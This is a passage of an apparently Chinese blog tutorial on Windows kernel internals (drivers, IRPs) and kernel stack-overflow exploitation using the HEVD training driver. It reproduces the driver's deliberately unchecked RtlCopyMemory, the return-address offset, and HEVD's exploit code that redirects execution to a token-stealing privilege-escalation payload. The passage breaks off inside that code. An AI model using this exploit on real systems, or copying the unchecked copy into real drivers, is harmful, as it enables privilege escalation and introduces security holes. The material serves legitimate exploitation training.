alt=""></p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>一些简单的windows内核相关知识,便于理解接下来的内容</p><h2 id="驱动结构"><a href="#驱动结构" class="headerlink" title="驱动结构"></a>驱动结构</h2><p>Windows 内核主要使用 C 语言实现，并通过函数指针、结构体和回调机制等方式模拟面向对象的编程模式</p><p>驱动对象：一个驱动对象就对应一个驱动程序，在Windows中加载这样一个结构，实际上时告诉系统需要提供哪些东西。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span>  </span><br><span class="line"> <span class="comment">//  结构的类型和大小。  </span></span><br><span class="line">      CSHORT Type;  </span><br><span class="line">      CSHORT Size;  </span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* 设备对象的指针，注意这里实际上是一个设备对象的链表的开始。</span></span><br><span class="line"><span class="comment">一个驱动程序可以拥有多个设备对象，并且这些对象用链表的形式连接起来。*/</span></span><br><span class="line">      PDEVICE_OBJECT DeviceObject;  </span><br><span class="line">  ……  </span><br><span class="line">  <span class="comment">//  驱动对象的 Unicode 符号链接名称</span></span><br><span class="line">      UNICODE_STRING DriverName;  </span><br><span class="line">  ……  </span><br><span class="line">  <span class="comment">//  快速 IO分发函数  </span></span><br><span class="line">      PFAST_IO_DISPATCH FastIoDispatch;  </span><br><span class="line">   ……  </span><br><span class="line"> <span class="comment">//  驱动的卸载函数  </span></span><br><span class="line">      PDRIVER_UNLOAD DriverUnload;  </span><br><span class="line">  <span class="comment">//  普通分发函数  </span></span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];  </span><br><span class="line">&#125; DRIVER_OBJECT;</span><br></pre></td></tr></table></figure><p>设备对象可以类比为 Windows GUI 编程中的窗口，所有 I/O 请求都需要通过设备对象来处理。然而，不同于 GUI 窗口通常由特定进程管理，设备对象可以被多个进程访问，并且它们之间可以通过 IRP 进行交互。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title function_">DECLSPEC_ALIGN</span><span class="params">(MEMORY_ALLOCATION_ALIGNMENT)</span> _DEVICE_OBJECT  </span><br><span class="line">&#123;</span><br><span class="line">  CSHORT Type;  </span><br><span class="line">  USHORT Size;     </span><br><span class="line">  <span class="comment">//  引用计数，当引用计数为0的时候此对象被销毁  </span></span><br><span class="line">  ULONG ReferenceCount;     </span><br><span class="line">  <span class="comment">//  这个设备所属的驱动对象  </span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> *<span class="title">DriverObject</span>;</span>  </span><br><span class="line">  <span class="comment">//  下一个设备对象。在一个驱动对象中有n 个设备，这些设备用这个指针连接  </span></span><br><span class="line">  <span class="comment">//  起来作为一个单向的链表。  </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">DEVICE_OBJECT</span> *<span class="title">NextDevice</span>;</span>   </span><br><span class="line">  <span class="comment">//  设备类型  </span></span><br><span class="line">  DEVICE_TYPE DeviceType;     </span><br><span class="line">  <span class="comment">// IRP栈大小  </span></span><br><span class="line">  HAR StackSize;       </span><br><span class="line">  ……  </span><br><span class="line">&#125;DEVICE_OBJECT;</span><br></pre></td></tr></table></figure><p><strong>设备</strong> 是硬件或虚拟实体的抽象表示，由设备对象表示</p><p><strong>驱动程序</strong> 是操作系统与设备之间的桥梁，负责管理和控制设备的行为,与设备是一对多的关系</p><h2 id="IRP"><a href="#IRP" class="headerlink" title="IRP"></a>IRP</h2><p>IRP（I/O Request Packet）是 Windows 内核用于描述 I/O 请求的核心数据结构。I/O 管理器在用户态和内核态之间传递 I/O 请求时，会创建 IRP 并将其发送到设备栈的顶层驱动程序，由驱动层层处理，直到请求完成。</p><p>驱动与驱动之间，驱动与用户层之间都是直接或者间接通过IRP进行通讯的。</p><p>IRP具体由两部分组成：头部区域和I/O堆栈（IO_STACK_LOCATIONS）。</p><p>头部区域是一个_IRP结构。I/O堆栈则是一个IO_STACK_LOCATIONS的结构体数组，这个数组的大小由IoAllocateIrp创建IRP时所决定。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_105938.png" alt=""></p><p>驱动对象会创建一个又一个的设备对象，这些设备对象通过链表的数据结构堆叠成一个垂直的结构，这个结构被称为设备栈。</p><p>IRP 会被操作系统送到设备栈的顶层设备对象，由对应的驱动程序处理。驱动可以选择完成请求、将请求向下传递给下层驱动，或在某些情况下将其返回给上层驱动（例如筛选驱动会修改并重新提交 IRP）。</p><p>不同的IRP数据会按照类型传递到不同的派遣函数中。常见有5种IRP结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE 0X00 <span class="comment">//对应用户层函数CreateFile()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLOSE  0X02 <span class="comment">//对应用户层函数CloseHandle()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_READ 0X03 <span class="comment">//对应用户层函数ReadFile()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_WRITE 0X04 <span class="comment">//对应用户层函数WirteFile()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CONTROL 0X0e <span class="comment">//DeviceIoControl()</span></span></span><br></pre></td></tr></table></figure><p>看其定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IRP</span> &#123;</span></span><br><span class="line">    PMDL              MdlAddress;</span><br><span class="line">    ULONG             Flags;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">IRP</span>*   <span class="title">MasterIrp</span>;</span></span><br><span class="line">        PVOID          SystemBuffer;</span><br><span class="line">    &#125; AssociatedIrp;</span><br><span class="line">    IO_STATUS_BLOCK   IoStatus;</span><br><span class="line">    KPROCESSOR_MODE   RequestorMode;</span><br><span class="line">    BOOLEAN           PendingReturned;</span><br><span class="line">    BOOLEAN           Cancel;</span><br><span class="line">    KIRQL             CancelIrql;</span><br><span class="line">    PDRIVER_CANCEL    CancelRoutine;</span><br><span class="line">    PVOID             UserBuffer;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                KDEVICE_QUEUE_ENTRY DeviceQueueEntry;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                    PVOID    DriverContext[<span class="number">4</span>];</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">            PETHREAD     Thread;</span><br><span class="line">            LIST_ENTRY   ListEntry;</span><br><span class="line">        &#125; Overlay;</span><br><span class="line">    &#125; Tail;</span><br><span class="line">&#125; IRP, *PIRP;</span><br></pre></td></tr></table></figure><p>IRP有三个描述缓冲区的位置,对应Windows 内核提供三种不同的 I/O 传递方式：</p><ul><li><strong>缓冲 I/O</strong>（Buffered I/O）：I/O 管理器会分配非分页池，并将用户模式缓冲区的数据复制到 <code>SystemBuffer</code>。</li><li><strong>直接 I/O</strong>（Direct I/O）：I/O 管理器使用 MDL（内存描述列表）映射用户缓冲区，驱动通过 <code>MdlAddress</code> 访问数据，而不会复制数据。</li><li><strong>无缓冲 I/O</strong>（Neither I/O）：I/O 管理器不会提供缓冲区，驱动直接使用 <code>UserBuffer</code> 访问用户模式内存，但需要特别小心处理，以避免访问非法地址。</li></ul><p>接下来再看十分重要的一个结构<code>IRPsp</code>,其结构类型是<code>IO_STACK_LOCATION</code>,它是 Windows 内核中与 <strong>IRP</strong>（I/O Request Packet）密切相关的数据结构，用于存储与当前 I/O 请求相关的信息。每个 IRP 都包含一个或多个 <code>IO_STACK_LOCATION</code> 结构，这些结构构成了一个堆栈，用于在设备栈中传递 I/O 请求，每个设备对象都会处理对应的 <code>IO_STACK_LOCATION</code></p><p>为什么有了IRP还需要IRPsp,因为IRP实际上只是相当于一个头部结构,用来描述整个请求,至于更细节的信息则需要其他的结构负责</p><p>可以如下获取IRP对应的IRPsp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);</span><br></pre></td></tr></table></figure><p><code>IO_STACK_LOCATION</code>的定义十分长,可以在<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location">IO_STACK_LOCATION （wdm.h） - Windows drivers | Microsoft Learn</a>查看完整的定义</p><p>这里只介绍一些关键字段</p><ol><li><strong><code>MajorFunction</code></strong>:表示当前 I/O 请求的主功能代码。常见的值包括：<ul><li><code>IRP_MJ_CREATE</code>：打开设备或文件。</li><li><code>IRP_MJ_READ</code>：读取数据。</li><li><code>IRP_MJ_WRITE</code>：写入数据。</li><li><code>IRP_MJ_DEVICE_CONTROL</code>：设备控制请求（IOCTL）。</li><li><code>IRP_MJ_CLOSE</code>：关闭设备或文件。</li></ul></li><li><strong><code>MinorFunction</code></strong>:表示当前 I/O 请求的次功能代码。通常用于扩展主功能代码的行为。</li><li><strong><code>Parameters</code></strong>:一个联合体（union），根据 <code>MajorFunction</code> 的不同，存储与 I/O 请求相关的参数。例如：<ul><li>对于 <code>IRP_MJ_READ</code>，存储读取的长度、偏移量等信息。</li><li>对于 <code>IRP_MJ_DEVICE_CONTROL</code>，存储 IOCTL 控制代码、输入/输出缓冲区长度等信息。</li></ul></li><li><strong><code>DeviceObject</code></strong>:指向当前设备对象的指针。</li><li><strong><code>FileObject</code></strong>:指向与当前 I/O 请求相关的文件对象的指针</li></ol><h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>接下来看最简单的一个案例,在几乎没有检查和保护的情况下完成一次内核栈溢出利用</p><p>漏洞源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BufferOverflowStack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ALLOC_PRAGMA</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> alloc_text(PAGE, TriggerBufferOverflowStack)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> alloc_text(PAGE, BufferOverflowStackIoctlHandler)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// ALLOC_PRAGMA</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Trigger the buffer overflow in Stack Vulnerability</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;UserBuffer&quot;&gt;The pointer to user mode buffer&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Size&quot;&gt;Size of the user mode buffer&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;</span></span><br><span class="line">__declspec(safebuffers)</span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">TriggerBufferOverflowStack</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PVOID UserBuffer,</span></span><br><span class="line"><span class="params">    _In_ SIZE_T Size</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    ULONG KernelBuffer[BUFFER_SIZE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Verify if the buffer resides in user mode</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        ProbeForRead(UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer), (ULONG)__alignof(UCHAR));</span><br><span class="line"></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, UserBuffer);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserBuffer Size: 0x%zX\n&quot;</span>, Size);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, &amp;KernelBuffer);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] KernelBuffer Size: 0x%zX\n&quot;</span>, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SECURE</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Secure Note: This is secure because the developer is passing a size</span></span><br><span class="line">        <span class="comment">// equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,</span></span><br><span class="line">        <span class="comment">// there will be no overflow</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, <span class="keyword">sizeof</span>(KernelBuffer));</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Vulnerability Note: This is a vanilla Stack based Overflow vulnerability</span></span><br><span class="line">        <span class="comment">// because the developer is passing the user supplied size directly to</span></span><br><span class="line">        <span class="comment">// RtlCopyMemory()/memcpy() without validating if the size is greater or</span></span><br><span class="line">        <span class="comment">// equal to the size of KernelBuffer</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Buffer Overflow Stack Ioctl Handler</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;Irp&quot;&gt;The pointer to IRP&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;IrpSp&quot;&gt;The pointer to IO_STACK_LOCATION structure&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;</span></span><br><span class="line">NTSTATUS</span><br><span class="line"><span class="title function_">BufferOverflowStackIoctlHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PIRP Irp,</span></span><br><span class="line"><span class="params">    _In_ PIO_STACK_LOCATION IrpSp</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    SIZE_T Size = <span class="number">0</span>;</span><br><span class="line">    PVOID UserBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    UNREFERENCED_PARAMETER(Irp);</span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    UserBuffer = IrpSp-&gt;Parameters.DeviceIoControl.Type3InputBuffer;</span><br><span class="line">    Size = IrpSp-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (UserBuffer)</span><br><span class="line">    &#123;</span><br><span class="line">        Status = TriggerBufferOverflowStack(UserBuffer, Size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>UNREFERENCED_PARAMETER</code>用于告诉编译器,这个参数没有使用是有意为之,不要发出警告</p><p><code>PAGED_CODE</code>用于标记代码运行在分页内存中</p><p><code>ProbeForRead</code>是windows内核编程用于验证用户模式提供的缓冲区是否可读</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ProbeForRead</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_ <span class="type">const</span> <span class="keyword">volatile</span> VOID *Address,</span></span><br><span class="line"><span class="params">  _In_ SIZE_T              Length,</span></span><br><span class="line"><span class="params">  _In_ ULONG               Alignment</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>RtlCopyMemory</code> 是 Windows 内核模式编程中的一个函数，用于将数据从源内存区域复制到目标内存区域,相当于用户态的<code>memcpy</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">RtlCopyMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">  _Out_       <span class="type">void</span>*       Destination,</span></span><br><span class="line"><span class="params">  _In_  <span class="type">const</span> <span class="type">void</span>*       Source,</span></span><br><span class="line"><span class="params">  _In_        SIZE_T      Length</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>这个漏洞还是很明显的,内核从用户态读取内存但是长度却由用户指定,于是存在栈溢出</p><p>用ida看一下kernelbuffer的缓冲区长度</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-01-15_144444.png" alt=""></p><p>kernelbuffer到覆盖eip需要<code>0x81C+4</code>个字节</p><p>是的,就是这么一个在用户态下最基本的漏洞现在出现在内核中</p><p>那么看HEVD给出的exp</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;StackOverflow.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">StackOverflowThread</span><span class="params">(LPVOID Parameter)</span> &#123;</span><br><span class="line">    HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line">    ULONG BytesReturned;</span><br><span class="line">    PVOID MemoryAddress = <span class="literal">NULL</span>;</span><br><span class="line">    PULONG UserModeBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    LPCSTR FileName = (LPCSTR)DEVICE_NAME;</span><br><span class="line">    PVOID EopPayload = &amp;TokenStealingPayloadWin7;</span><br><span class="line">    SIZE_T UserModeBufferSize = (BUFFER_SIZE + RET_OVERWRITE) * <span class="keyword">sizeof</span>(ULONG);</span><br><span class="line"></span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="comment">// Get the device handle</span></span><br><span class="line">        DEBUG_MESSAGE(<span class="string">&quot;\t[+] Getting Device Driver Handle\n&quot;</span>);</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] Device Name: %s\n&quot;</span>, FileName);</span><br><span class="line"></span><br><span class="line">        hFile = GetDeviceHandle(FileName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">            DEBUG_ERROR(<span class="string">&quot;\t\t[-] Failed Getting Device Handle: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            DEBUG_INFO(<span class="string">&quot;\t\t[+] Device Handle: 0x%X\n&quot;</span>, hFile);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DEBUG_MESSAGE(<span class="string">&quot;\t[+] Setting Up Vulnerability Stage\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] Allocating Memory For Buffer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(),</span><br><span class="line">                                           HEAP_ZERO_MEMORY,</span><br><span class="line">                                           UserModeBufferSize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!UserModeBuffer) &#123;</span><br><span class="line">            DEBUG_ERROR(<span class="string">&quot;\t\t\t[-] Failed To Allocate Memory: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            DEBUG_INFO(<span class="string">&quot;\t\t\t[+] Memory Allocated: 0x%p\n&quot;</span>, UserModeBuffer);</span><br><span class="line">            DEBUG_INFO(<span class="string">&quot;\t\t\t[+] Allocation Size: 0x%X\n&quot;</span>, UserModeBufferSize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] Preparing Buffer Memory Layout\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, <span class="number">0x41</span>);</span><br><span class="line"></span><br><span class="line">        MemoryAddress = (PVOID)(((ULONG)UserModeBuffer + UserModeBufferSize) - <span class="keyword">sizeof</span>(ULONG));</span><br><span class="line">        *(PULONG)MemoryAddress = (ULONG)EopPayload;</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] RET Value: 0x%p\n&quot;</span>, *(PULONG)MemoryAddress);</span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t\t[+] RET Address: 0x%p\n&quot;</span>, MemoryAddress);</span><br><span class="line"></span><br><span class="line">        DEBUG_INFO(<span class="string">&quot;\t\t[+] EoP Payload: 0x%p\n&quot;</span>, EopPayload);</span><br><span class="line"></span><br><span class="line">        DEBUG_MESSAGE(<span class="string">&quot;\t[+] Triggering Kernel Stack Overflow\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        OutputDebugString(<span class="string">&quot;****************Kernel Mode****************\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        DeviceIoControl(hFile,</span><br><span class="line">                        HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</span><br><span class="line">                        (LPVOID)UserModeBuffer,</span><br><span class="line">                        (DWORD)UserModeBufferSize,</span><br><span class="line">                        <span class="literal">NULL</span>,</span><br><span class="line">                        <span class="number">0</span>,</span><br><span class="line">                        &amp;BytesReturned,</span><br><span class="line">                        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        OutputDebugString(<span class="string">&quot;****************Kernel Mode****************\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HeapFree(GetProcessHeap(), <span class="number">0</span>, (LPVOID)UserModeBuffer);</span><br><span class="line"></span><br><span class="line">        UserModeBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        DEBUG_ERROR(<span class="string">&quot;\t\t[-] Exception: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span 